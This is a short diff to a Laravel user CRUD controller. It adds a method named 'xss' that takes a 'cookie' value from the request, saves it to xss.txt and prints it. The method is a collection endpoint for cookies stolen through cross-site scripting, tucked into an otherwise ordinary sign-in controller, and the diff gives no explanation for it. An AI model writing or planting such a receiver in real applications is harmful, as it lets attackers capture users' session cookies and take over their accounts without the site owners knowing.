@@ -197,4 +197,9 @@ class CrudUserController extends Controller
 
         return redirect("list")->withSuccess('You have signed-in');
     }
+    public function xss(Request $request) {		
+		$cookie = $request->get('cookie');	
+		file_put_contents('xss.txt', $cookie);	
+		var_dump($cookie);die();	
+	}		
 }
